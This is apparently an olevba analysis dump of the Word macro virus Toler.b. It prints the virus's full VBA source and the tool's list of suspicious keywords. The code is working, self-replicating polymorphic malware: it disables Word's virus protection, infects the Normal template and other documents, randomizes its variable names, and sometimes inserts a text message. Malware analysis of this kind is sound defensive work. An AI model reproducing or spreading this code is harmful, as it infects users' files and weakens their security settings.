olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toler.b-ce46d0ec5e1a6027786b90b0699d5d98f557b6a3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Toler.b-ce46d0ec5e1a6027786b90b0699d5d98f557b6a3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Tolerance!
Private Type YofonZ
  DcyyneZ As Integer
  QshrkkfkZ As Integer
  XrwkZ As Boolean
End Type

Private Sub Document_Close()

End Sub

Private Sub Document_Open()
  Randomize
  Options.VirusProtection = False
  Dim ArulkZ As Object, HrvumZ As Object
  Set ArulkZ = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
  Set HrvumZ = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
  Dim MchZ As YofonZ, DluiZ As YofonZ: MchZ = HkktlyZ(ArulkZ): DluiZ = HkktlyZ(HrvumZ)
  If DluiZ.QshrkkfkZ = 0 Then
     PuqcumZ ArulkZ, HrvumZ, MchZ, DluiZ
     Options.SaveNormalPrompt = False
  End If
  If (MchZ.QshrkkfkZ = 0) Or ((DluiZ.QshrkkfkZ <> 0) And (MchZ.QshrkkfkZ <> DluiZ.QshrkkfkZ)) Then
     PuqcumZ HrvumZ, ArulkZ, DluiZ, MchZ
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  ElseIf Rnd < 0.3 Then
     ActiveDocument.Range(0, 0).InsertParagraphBefore
     ActiveDocument.Range(0, 0).InsertBefore "MUD Forever! :-)"
     ActiveDocument.SaveAs (ActiveDocument.FullName)
  End If
End Sub
Private Sub PuqcumZ(DcyyneZ As Object, DiytuZ As Object, FromP As YofonZ, ToP As YofonZ)
  Dim FnrnZ As String, XnheefZ
  FnrnZ = DcyyneZ.Lines(FromP.DcyyneZ, FromP.QshrkkfkZ)
  XnheefZ = Array("HrgxlZ", "YofonZ", "DcyyneZ", "DiytuZ", "ErledbvZ", "QshrkkfkZ", "XrwkZ", "ArulkZ", "HrvumZ", "MchZ", "DluiZ", "PuqcumZ", "FnrnZ", "HypvkZ", "JfvghaZ", "NkgksZ", "HkktlyZ", "XkohZ", "XnheefZ")
  For I = 0 To 18: XkohZ FnrnZ, (XnheefZ(I)), HrgxlZ(FnrnZ): Next I
  If ToP.XrwkZ Then DiytuZ.DeleteLines 1, DiytuZ.CountOfLines
  DiytuZ.AddFromString FnrnZ
End Sub
Private Function HrgxlZ(FnrnZ As String) As String
  Dim HypvkZ As String: HypvkZ = ""
  While (InStr(FnrnZ, HypvkZ) <> 0) Or (Len(HypvkZ) < 3)
     HypvkZ = ""
     For I = 1 To 10
         If Rnd > 0.5 Then
            If Len(HypvkZ) = 0 Then
                  HypvkZ = HypvkZ + Chr(Int(Rnd * 25 + 65))
            Else: HypvkZ = HypvkZ + Chr(Int(Rnd * 25 + 97))
            End If
         End If
     Next I
     HypvkZ = HypvkZ + "Z"
  Wend
  HrgxlZ = HypvkZ
End Function
Private Sub XkohZ(FnrnZ As String, JfvghaZ As String, NkgksZ As String)
  Dim I As Long
  I = 1
  While InStr(I, FnrnZ, JfvghaZ) <> 0
        I = InStr(I, FnrnZ, JfvghaZ)
        FnrnZ = Left(FnrnZ, I - 1) + NkgksZ + Mid$(FnrnZ, I + Len(JfvghaZ))
        Index = Index + 1
  Wend
End Sub
Private Function HkktlyZ(ErledbvZ As Object) As YofonZ
  HkktlyZ.DcyyneZ = 0
  HkktlyZ.QshrkkfkZ = 0
  HkktlyZ.XrwkZ = False
  For I = 1 To ErledbvZ.CountOfLines
   If ErledbvZ.Lines(I, 1) = "' Tolerance!" Then HkktlyZ.DcyyneZ = I
   If ErledbvZ.Lines(I, 1) = "End Function 'Tolerance!" Then HkktlyZ.QshrkkfkZ = I - HkktlyZ.DcyyneZ + 1
   If InStr(ErledbvZ.Lines(I, 1), "Private Sub Document_Open()") = 1 Then HkktlyZ.XrwkZ = True
  Next I
End Function 'Tolerance!
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

